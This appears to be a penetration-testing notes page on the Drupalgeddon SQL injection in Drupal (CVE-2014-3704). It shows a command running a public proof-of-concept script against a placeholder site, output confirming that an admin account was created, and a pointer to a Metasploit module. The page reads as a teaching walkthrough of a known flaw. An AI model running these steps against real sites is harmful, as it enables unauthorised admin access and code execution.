---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# CVE-2014-3704 - Drupalgeddon

This flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution.

{% hint style="info" %}
## Exploit DB

[https://www.exploit-db.com/exploits/34992](https://www.exploit-db.com/exploits/34992)
{% endhint %}

## Script Execution

{% code title="Command" %}
```bash
python2.7 drupalgeddon.py -t http://drupal.acme.com -u hacker -p pwnd
```
{% endcode %}

{% code title="Output" %}
```bash
<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal.acme.com/?q=node&destination=node
```
{% endcode %}

## Metasploit Module

We could also use the [exploit/multi/http/drupal\_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module to exploit this.
